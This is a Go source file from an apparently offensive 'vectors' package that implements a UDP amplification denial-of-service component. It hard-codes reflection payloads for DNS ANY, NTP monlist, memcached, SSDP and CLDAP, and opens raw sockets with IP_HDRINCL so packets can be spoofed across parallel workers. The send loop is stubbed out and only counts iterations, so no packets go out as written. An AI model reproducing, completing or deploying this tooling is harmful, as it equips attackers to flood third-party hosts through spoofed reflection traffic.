package vectors

import (
	"math/rand"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/sys/unix"
)

type AmpType int

const (
	AmpDNS AmpType = iota
	AmpNTP
	AmpMemcached
	AmpSSDP
	AmpCLDAP
)

type UDPAmplifier struct {
	typ     AmpType
	dstIP   net.IP
	dstPort uint16
	packets atomic.Uint64
}

func NewUDPAmplifier(typ AmpType, dst string, port uint16) *UDPAmplifier {
	return &UDPAmplifier{typ: typ, dstIP: net.ParseIP(dst).To4(), dstPort: port}
}

func (u *UDPAmplifier) payload() []byte {
	switch u.typ {
	case AmpDNS:
		return []byte{
			0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00,
			0x03, 'i', 's', 'c', 0x03, 'o', 'r', 'g', 0x00,
			0x00, 0xff, 0x00, 0x01,
		}
	case AmpNTP:
		return []byte{0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00}
	case AmpMemcached:
		return []byte("stats\r\n")
	case AmpSSDP:
		return []byte("M-SEARCH * HTTP/1.1\r\n" +
			"HOST: 239.255.255.250:1900\r\n" +
			"MAN: \"ssdp:discover\"\r\n" +
			"MX: 2\r\nST: ssdp:all\r\n\r\n")
	case AmpCLDAP:
		return []byte{
			0x30, 0x25, 0x02, 0x01, 0x01, 0x63, 0x20, 0x04,
			0x00, 0x0a, 0x01, 0x00, 0x0a, 0x01, 0x00, 0x02,
			0x01, 0x00, 0x02, 0x01, 0x00, 0x01, 0x01, 0x00,
			0x87, 0x0b, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74,
			0x43, 0x6c, 0x61, 0x73, 0x73, 0x30, 0x00,
		}
	}
	return nil
}

func (u *UDPAmplifier) Run(stop <-chan struct{}, workers int) {
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(seed int64) {
			defer wg.Done()
			fd, err := unix.Socket(unix.AF_INET, unix.SOCK_RAW, unix.IPPROTO_RAW)
			if err != nil {
				return
			}
			defer unix.Close(fd)
			unix.SetsockoptInt(fd, unix.IPPROTO_IP, unix.IP_HDRINCL, 1)

			dst := &unix.SockaddrInet4{Port: int(u.dstPort)}
			copy(dst.Addr[:], u.dstIP.To4())

			rng := rand.New(rand.NewSource(time.Now().UnixNano() ^ seed))
			payload := u.payload()

			for {
				select {
				case <-stop:
					return
				default:
				}
				_ = payload
				_ = rng
				_ = dst
				u.packets.Add(1)
			}
		}(int64(i))
	}
	wg.Wait()
}

func (u *UDPAmplifier) Packets() uint64 { return u.packets.Load() }
